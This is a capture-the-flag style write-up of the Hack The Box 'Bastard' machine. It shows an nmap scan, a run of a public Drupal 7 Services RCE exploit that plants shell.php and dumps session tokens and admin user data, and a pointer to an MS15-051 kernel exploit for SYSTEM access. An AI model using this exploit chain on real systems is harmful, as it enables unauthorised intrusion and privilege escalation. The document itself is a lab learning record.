# Bastard - Windows

Difficulty: 1

## Enumeration

nmap scan

```bash
------------------------------------------------------------                                   
        Threader 3000 - Multi-threaded Port Scanner                                            
                       Version 1.0.7                                                           
                   A project by The Mayor                                                      
------------------------------------------------------------                                   
Enter your target IP address or URL here: 10.10.10.9                                           
------------------------------------------------------------                                   
Scanning target 10.10.10.9                                                                     
Time started: 2021-09-15 09:01:11.649504                                                       
------------------------------------------------------------                                   
Port 80 is open                                                                                
Port 135 is open                                                                               
Port 49154 is open                                                                             
Port scan completed in 0:01:39.888104                                                          
------------------------------------------------------------                                   
Threader3000 recommends the following Nmap scan:                                               
************************************************************                                   
nmap -p80,135,49154 -sV -sC -T4 -Pn -oA 10.10.10.9 10.10.10.9                                  
************************************************************                                   
Would you like to run Nmap or quit to terminal?                                                
------------------------------------------------------------                                   
1 = Run suggested Nmap scan                                                                    
2 = Run another Threader3000 scan                                                              
3 = Exit to terminal                                                                           
------------------------------------------------------------                                   
Option Selection: 1                                                                            
nmap -p80,135,49154 -sV -sC -T4 -Pn -oA 10.10.10.9 10.10.10.9                                  
Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-15 09:04 IST                                
Nmap scan report for bastard.htb (10.10.10.9)                                                  
Host is up (0.17s latency).                                                                    
                                                                                               
PORT      STATE SERVICE VERSION                                                                
80/tcp    open  http    Microsoft IIS httpd 7.5                                                
| http-methods:                                                                                
|_  Potentially risky methods: TRACE                                                           
|_http-generator: Drupal 7 (http://drupal.org)                                                 
| http-robots.txt: 36 disallowed entries (15 shown)                                            
| /includes/ /misc/ /modules/ /profiles/ /scripts/                                             
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt                                         
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt                             
|_/LICENSE.txt /MAINTAINERS.txt                                                                
135/tcp   open  msrpc   Microsoft Windows RPC                                                  
49154/tcp open  msrpc   Microsoft Windows RPC                                                  
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows                                       
                                                                                               
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 
Nmap done: 1 IP address (1 host up) scanned in 97.43 seconds
```

## Initial access

```bash
[piyush@arch]-[~/hackthebox/bastard]                                 
>>> php 41564.php                                                    
# Exploit Title: Drupal 7.x Services Module Remote Code Execution    
# Vendor Homepage: https://www.drupal.org/project/services           
# Exploit Author: Charles FOL                                        
# Contact: https://twitter.com/ambionics                             
# Website: https://www.ambionics.io/blog/drupal-services-module-rce  
                                                                     
                                                                     
#!/usr/bin/php                                                       
Stored session information in session.json                           
Stored user information in user.json                                 
Cache contains 7 entries                                             
File written: http://10.10.10.9/shell.php                            
[piyush@arch]-[~/hackthebox/bastard]                                 
>>> ls -l                                                            
total 32                                                             
drwxr-xr-x 2 piyush piyush 4096 Sep 15 09:04 10.10.10.9              
-rw-r--r-- 1 piyush piyush 8657 Sep 15 09:49 41564.php
-rw-r--r-- 1 piyush piyush  187 Sep 15 09:49 session.json
-rwxr-xr-x 1 piyush piyush 5468 Sep 15 09:48 shell.php
-rw-r--r-- 1 piyush piyush  799 Sep 15 09:49 user.json
[piyush@arch]-[~/hackthebox/bastard]
>>> cat session.json
{
    "session_name": "SESSd873f26fc11f2b7e6e4aa0f6fce59913",
    "session_id": "oAs3Zyz6WQR4KVsUKj1ZmPUw6enrRIJ_1mwhMn5EtSM",
    "token": "fWlsQEzNev3ir7hxowV7eTRq1gPWcnn4x-qyy1JV8I0"
}%                        
[piyush@arch]-[~/hackthebox/bastard]
>>> cat user.json
{
    "uid": "1",
    "name": "admin",
    "mail": "drupal@hackthebox.gr",
    "theme": "",
    "created": "1489920428",
    "access": "1631679657",
    "login": 1631679842,
    "status": "1",
    "timezone": "Europe\/Athens",
    "language": "",
    "picture": null,
    "init": "drupal@hackthebox.gr",
    "data": false,
    "roles": {
        "2": "authenticated user",
        "3": "administrator"
    },
    "rdf_mapping": {
```

![Untitled](Bastard%20-%20Windows%201c7a5b55972c4e88ade1050f413db521/Untitled.png)

## Privilege Escalation

![Untitled](Bastard%20-%20Windows%201c7a5b55972c4e88ade1050f413db521/Untitled%201.png)

Using a cmd reverse shell instead

[](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip)

Used this kernel exploit to gain system shell